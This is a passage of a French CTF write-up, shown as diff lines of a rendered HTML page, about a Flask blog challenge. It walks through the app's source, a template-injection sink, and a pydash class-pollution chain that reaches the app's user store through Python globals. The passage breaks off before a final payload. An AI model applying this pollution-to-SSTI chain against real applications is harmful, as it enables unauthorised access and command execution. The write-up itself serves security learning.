+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/register&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;GET&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;GET&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;register.html&#39;</span>)
+</span></span><span style="display:flex;"><span>    username, password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;username&#39;</span>), request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;password&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> type(username) <span style="color:#f92672">!=</span> str <span style="color:#f92672">or</span> type(password) <span style="color:#f92672">!=</span> str:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;register.html&#34;</span>, error<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Wtf are you trying bro ?!&#34;</span>)
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> users<span style="color:#f92672">.</span>create(username, password)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> result <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;username&#39;</span>:username, <span style="color:#e6db74">&#39;seeTemplate&#39;</span>: users[username][<span style="color:#e6db74">&#39;seeTemplate&#39;</span>]}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> result <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;register.html&#34;</span>, error<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;User already registered&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;register.html&#34;</span>, error<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Error while registering user&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/login&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;GET&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;GET&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;login.html&#39;</span>)
+</span></span><span style="display:flex;"><span>    username, password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;username&#39;</span>), request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;password&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> type(username) <span style="color:#f92672">!=</span> str <span style="color:#f92672">or</span> type(password) <span style="color:#f92672">!=</span> str:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;login.html&#39;</span>, error<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Wtf are you trying bro ?!&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> users<span style="color:#f92672">.</span>login(username, password) <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;username&#39;</span>:username, <span style="color:#e6db74">&#39;seeTemplate&#39;</span>: users[username][<span style="color:#e6db74">&#39;seeTemplate&#39;</span>]}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;login.html&#34;</span>, error<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Error while login user&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/logout&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logout</span>():
+</span></span><span style="display:flex;"><span>    session<span style="color:#f92672">.</span>pop(<span style="color:#e6db74">&#39;user&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;home.html&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>run(<span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, <span style="color:#ae81ff">5000</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span></code></pre></div><p>On a ensuite 2 class:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pydash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Articles</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>set(<span style="color:#e6db74">&#39;welcome&#39;</span>, <span style="color:#e6db74">&#39;Test of new template system: {%block test%}Block test{</span><span style="color:#e6db74">%e</span><span style="color:#e6db74">ndblock%}&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set</span>(self, article_name, article_content):
+</span></span><span style="display:flex;"><span>        pydash<span style="color:#f92672">.</span>set_(self, article_name, article_content)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self, article_name):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hasattr(self, article_name):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (self<span style="color:#f92672">.</span>__dict__[article_name])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove</span>(self, article_name):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hasattr(self, article_name):
+</span></span><span style="display:flex;"><span>            delattr(self, article_name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_all</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>__dict__
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __getitem__(self, article_name):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>get(article_name)
+</span></span></code></pre></div><p>et</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Users</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    users <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>users[<span style="color:#e6db74">&#39;admin&#39;</span>] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;password&#39;</span>: <span style="color:#66d9ef">None</span>, <span style="color:#e6db74">&#39;restricted&#39;</span>: <span style="color:#66d9ef">False</span>, <span style="color:#e6db74">&#39;seeTemplate&#39;</span>:<span style="color:#66d9ef">True</span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(self, username, password):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> username <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>users:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>users[username]<span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;password&#39;</span>: hashlib<span style="color:#f92672">.</span>sha256(password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest(), <span style="color:#e6db74">&#39;restricted&#39;</span>: <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">&#39;seeTemplate&#39;</span>: <span style="color:#66d9ef">False</span>}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>(self, username, password):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> username <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>users <span style="color:#f92672">and</span> self<span style="color:#f92672">.</span>users[username][<span style="color:#e6db74">&#39;password&#39;</span>] <span style="color:#f92672">==</span> hashlib<span style="color:#f92672">.</span>sha256(password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest():
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">seeTemplate</span>(self, username, value):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> username <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>users <span style="color:#f92672">and</span> self<span style="color:#f92672">.</span>users[username]<span style="color:#f92672">.</span>restricted <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>users[username]<span style="color:#f92672">.</span>seeTemplate <span style="color:#f92672">=</span> value
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __getitem__(self, username):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> username <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>users:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>users[username]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span></code></pre></div><p>Après une lecture du code, on comprend que :</p>
+<ul>
+<li>
+<p>un utilisateur a 2 propriétés:</p>
+<ul>
+<li>restricted <em>(default=True)</em></li>
+<li>seeTemplate <em>(default=False)</em></li>
+</ul>
+</li>
+<li>
+<p>On peut créer des <em>articles</em></p>
+<ul>
+<li>nom de l&rsquo;article</li>
+<li>valeur de l&rsquo;article</li>
+</ul>
+</li>
+<li>
+<p>On peut voir un <em>article</em>:</p>
+<ul>
+<li>avec <code>render_template</code></li>
+<li>avec <code>render_template_string</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="vulnérabilités">Vulnérabilité(s):</h1>
+<ul>
+<li>La première chose qu&rsquo;il faut voir est que <code>render_template_string</code> est vulnérable à une attaque de type <em>Server-Side-Template-Injection</em>.<br>
+Nous contrôlons le contenu de ce qui est passé en paramètre de cette fonction (le contenu de l&rsquo;article) donc si nous arrivons dans ce code : le tour est joué et nous avons notre exécution de commande.</li>
+</ul>
+<p>Notre objectif est donc de passer le paramètre <code>seeTemplate</code> de notre utilisateur à <code>True</code>.</p>
+<p>Pour se faire, on se rend qu&rsquo;il existe un endpoint <em>/show_template</em> qui permet de modifier cette valeur.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/show_template&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_template</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;user&#39;</span> <span style="color:#f92672">in</span> session <span style="color:#f92672">and</span> users[session[<span style="color:#e6db74">&#39;user&#39;</span>][<span style="color:#e6db74">&#39;username&#39;</span>]][<span style="color:#e6db74">&#39;restricted&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;value&#39;</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span>:
+</span></span><span style="display:flex;"><span>            users[session[<span style="color:#e6db74">&#39;user&#39;</span>][<span style="color:#e6db74">&#39;username&#39;</span>]][<span style="color:#e6db74">&#39;seeTemplate&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>            session[<span style="color:#e6db74">&#39;user&#39;</span>][<span style="color:#e6db74">&#39;seeTemplate&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            users[session[<span style="color:#e6db74">&#39;user&#39;</span>][<span style="color:#e6db74">&#39;username&#39;</span>]][<span style="color:#e6db74">&#39;seeTemplate&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>            session[<span style="color:#e6db74">&#39;user&#39;</span>][<span style="color:#e6db74">&#39;seeTemplate&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/articles&#39;</span>)
+</span></span></code></pre></div><p>Ainsi, si on accède à <code>/show_template?value=1</code>, si nôtre utilisateur a la propriété <code>restricted</code> à <code>False</code>, la valeur de <code>seeTemplate</code> sera modifié.</p>
+<ul>
+<li>
+<p>La seconde Vulnérabilité se trouve dans la class de <code>Articles</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pydash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set</span>(self, article_name, article_content):
+</span></span><span style="display:flex;"><span>    pydash<span style="color:#f92672">.</span>set_(self, article_name, article_content)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span></code></pre></div><p>Ce code est utilisé pour ajouter un article en mémoire.<br>
+Le problème est que le serveur utilise <code>pydash</code> pour associer à <code>article_name</code> la valeur <code>article_content</code>.</p>
+<p>On peut ré-écrire cette fonction comme :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set</span>(self, article_name, article_content):
+</span></span><span style="display:flex;"><span>    self[article_name] <span style="color:#f92672">=</span> article_content
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span></code></pre></div><p>Vous l&rsquo;aurez peut-être compris, on peut écrire n&rsquo;importe qu&rsquo;elle valeur dans des clés qui sont hors de <em>Articles</em>.<br>
+A la même manière qu&rsquo;une pyjail ou une ssti, on peut essayer de remonter aux objets de l&rsquo;application flask pour modifier une propriété de l&rsquo;utilisateur.</p>
+<p>On peut tester en local <em>pydash</em> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> pydash<span style="color:#f92672">.</span>set_({<span style="color:#e6db74">&#34;A&#34;</span>:{<span style="color:#e6db74">&#34;B&#34;</span>:<span style="color:#e6db74">&#34;C&#34;</span>}}, <span style="color:#e6db74">&#34;A.B&#34;</span>, <span style="color:#e6db74">&#34;D&#34;</span>)
+</span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#39;A&#39;</span>: {<span style="color:#e6db74">&#39;B&#39;</span>: <span style="color:#e6db74">&#39;D&#39;</span>}}
+</span></span></code></pre></div><p>On peut modifier la fonction <em>set</em> en local pour afficher le contenu de chemin python :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set</span>(self, article_name, article_content):
+</span></span><span style="display:flex;"><span>  x <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__loader__&#39;</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;sys&#39;</span>]
+</span></span><span style="display:flex;"><span>  print(dir(x),x)
+</span></span><span style="display:flex;"><span>  pydash<span style="color:#f92672">.</span>set_(self, article_name, article_content)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker-compose build;docker-compose up
+</span></span></code></pre></div><p><em>Résultats</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>  blog_pollution-anozerblog-1  | <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;__breakpointhook__&#39;</span>, <span style="color:#e6db74">&#39;__displayhook__&#39;</span>, <span style="color:#e6db74">&#39;__doc__&#39;</span>, <span style="color:#e6db74">&#39;__excepthook__&#39;</span>, <span style="color:#e6db74">&#39;__interactivehook__&#39;</span>, <span style="color:#e6db74">&#39;__loader__&#39;</span>, <span style="color:#e6db74">&#39;__name__&#39;</span>, <span style="color:#e6db74">&#39;__package__&#39;</span>, <span style="color:#e6db74">&#39;__spec__&#39;</span>, <span style="color:#e6db74">&#39;__stderr__&#39;</span>, <span style="color:#e6db74">&#39;__stdin__&#39;</span>, <span style="color:#e6db74">&#39;__stdout__&#39;</span>, <span style="color:#e6db74">&#39;__unraisablehook__&#39;</span>, <span style="color:#e6db74">&#39;_base_executable&#39;</span>, <span style="color:#e6db74">&#39;_clear_type_cache&#39;</span>, <span style="color:#e6db74">&#39;_current_frames&#39;</span>, <span style="color:#e6db74">&#39;_debugmallocstats&#39;</span>, <span style="color:#e6db74">&#39;_framework&#39;</span>, <span style="color:#e6db74">&#39;_getframe&#39;</span>, <span style="color:#e6db74">&#39;_git&#39;</span>, <span style="color:#e6db74">&#39;_home&#39;</span>, <span style="color:#e6db74">&#39;_xoptions&#39;</span>, <span style="color:#e6db74">&#39;abiflags&#39;</span>, <span style="color:#e6db74">&#39;addaudithook&#39;</span>, <span style="color:#e6db74">&#39;api_version&#39;</span>, <span style="color:#e6db74">&#39;argv&#39;</span>, <span style="color:#e6db74">&#39;audit&#39;</span>, <span style="color:#e6db74">&#39;base_exec_prefix&#39;</span>, <span style="color:#e6db74">&#39;base_prefix&#39;</span>, <span style="color:#e6db74">&#39;breakpointhook&#39;</span>, <span style="color:#e6db74">&#39;builtin_module_names&#39;</span>, <span style="color:#e6db74">&#39;byteorder&#39;</span>, <span style="color:#e6db74">&#39;call_tracing&#39;</span>, <span style="color:#e6db74">&#39;callstats&#39;</span>, <span style="color:#e6db74">&#39;copyright&#39;</span>, <span style="color:#e6db74">&#39;displayhook&#39;</span>, <span style="color:#e6db74">&#39;dont_write_bytecode&#39;</span>, <span style="color:#e6db74">&#39;exc_info&#39;</span>, <span style="color:#e6db74">&#39;excepthook&#39;</span>, <span style="color:#e6db74">&#39;exec_prefix&#39;</span>, <span style="color:#e6db74">&#39;executable&#39;</span>, <span style="color:#e6db74">&#39;exit&#39;</span>, <span style="color:#e6db74">&#39;flags&#39;</span>, <span style="color:#e6db74">&#39;float_info&#39;</span>, <span style="color:#e6db74">&#39;float_repr_style&#39;</span>, <span style="color:#e6db74">&#39;get_asyncgen_hooks&#39;</span>, <span style="color:#e6db74">&#39;get_coroutine_origin_tracking_depth&#39;</span>, <span style="color:#e6db74">&#39;get_int_max_str_digits&#39;</span>, <span style="color:#e6db74">&#39;getallocatedblocks&#39;</span>, <span style="color:#e6db74">&#39;getcheckinterval&#39;</span>, <span style="color:#e6db74">&#39;getdefaultencoding&#39;</span>, <span style="color:#e6db74">&#39;getdlopenflags&#39;</span>, <span style="color:#e6db74">&#39;getfilesystemencodeerrors&#39;</span>, <span style="color:#e6db74">&#39;getfilesystemencoding&#39;</span>, <span style="color:#e6db74">&#39;getprofile&#39;</span>, <span style="color:#e6db74">&#39;getrecursionlimit&#39;</span>, <span style="color:#e6db74">&#39;getrefcount&#39;</span>, <span style="color:#e6db74">&#39;getsizeof&#39;</span>, <span style="color:#e6db74">&#39;getswitchinterval&#39;</span>, <span style="color:#e6db74">&#39;gettrace&#39;</span>, <span style="color:#e6db74">&#39;hash_info&#39;</span>, <span style="color:#e6db74">&#39;hexversion&#39;</span>, <span style="color:#e6db74">&#39;implementation&#39;</span>, <span style="color:#e6db74">&#39;int_info&#39;</span>, <span style="color:#e6db74">&#39;intern&#39;</span>, <span style="color:#e6db74">&#39;is_finalizing&#39;</span>, <span style="color:#e6db74">&#39;maxsize&#39;</span>, <span style="color:#e6db74">&#39;maxunicode&#39;</span>, <span style="color:#e6db74">&#39;meta_path&#39;</span>, <span style="color:#e6db74">&#39;modules&#39;</span>, <span style="color:#e6db74">&#39;path&#39;</span>, <span style="color:#e6db74">&#39;path_hooks&#39;</span>, <span style="color:#e6db74">&#39;path_importer_cache&#39;</span>, <span style="color:#e6db74">&#39;platform&#39;</span>, <span style="color:#e6db74">&#39;prefix&#39;</span>, <span style="color:#e6db74">&#39;pycache_prefix&#39;</span>, <span style="color:#e6db74">&#39;set_asyncgen_hooks&#39;</span>, <span style="color:#e6db74">&#39;set_coroutine_origin_tracking_depth&#39;</span>, <span style="color:#e6db74">&#39;set_int_max_str_digits&#39;</span>, <span style="color:#e6db74">&#39;setcheckinterval&#39;</span>, <span style="color:#e6db74">&#39;setdlopenflags&#39;</span>, <span style="color:#e6db74">&#39;setprofile&#39;</span>, <span style="color:#e6db74">&#39;setrecursionlimit&#39;</span>, <span style="color:#e6db74">&#39;setswitchinterval&#39;</span>, <span style="color:#e6db74">&#39;settrace&#39;</span>, <span style="color:#e6db74">&#39;stderr&#39;</span>, <span style="color:#e6db74">&#39;stdin&#39;</span>, <span style="color:#e6db74">&#39;stdout&#39;</span>, <span style="color:#e6db74">&#39;thread_info&#39;</span>, <span style="color:#e6db74">&#39;unraisablehook&#39;</span>, <span style="color:#e6db74">&#39;version&#39;</span>, <span style="color:#e6db74">&#39;version_info&#39;</span>, <span style="color:#e6db74">&#39;warnoptions&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>  &lt;module <span style="color:#e6db74">&#39;sys&#39;</span> <span style="color:#f92672">(</span>built-in<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span>blog_pollution-anozerblog-1  |  * Serving Flask app <span style="color:#e6db74">&#39;app&#39;</span>
+</span></span><span style="display:flex;"><span>blog_pollution-anozerblog-1  |  * Debug mode: on
+</span></span><span style="display:flex;"><span>blog_pollution-anozerblog-1  | WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+</span></span><span style="display:flex;"><span>blog_pollution-anozerblog-1  |  * Running on all addresses <span style="color:#f92672">(</span>0.0.0.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>blog_pollution-anozerblog-1  |  * Running on http://127.0.0.1:5000
+</span></span><span style="display:flex;"><span>blog_pollution-anozerblog-1  |  * Running on http://172.18.0.2:5000
+</span></span><span style="display:flex;"><span>blog_pollution-anozerblog-1  | Press CTRL+C to quit
+</span></span><span style="display:flex;"><span>blog_pollution-anozerblog-1  |  * Restarting with stat
+</span></span><span style="display:flex;"><span>blog_pollution-anozerblog-1  |  * Debugger is active!
+</span></span><span style="display:flex;"><span>blog_pollution-anozerblog-1  |  * Debugger PIN: 590-441-492
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>On accède ici au module <em>sys</em>.
+On peut aller encore plus loin est accéder au dictionnaire contenant les utilisateurs :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>x <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__loader__&#39;</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;sys&#39;</span>]<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;__main__&#39;</span>]<span style="color:#f92672">.</span>users
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;users.Users object at 0x7f54b78e9640&gt;
+</span></span></code></pre></div></li>
+</ul>
+<p>La méthode intended serai de modifier la propriété <em>restricted</em> de notre utilisateur pour ensuite activer <em>seeTemplate</em> et abusé de la SSTI.</p>
+<p>Je vais ici présenter une méthode un petit peu plus rapide.
+On remarque qu&rsquo;un utilisateur <code>admin</code> est déjà présent:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Users</span>:
+</span></span><span style="display:flex;"><span>    users <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
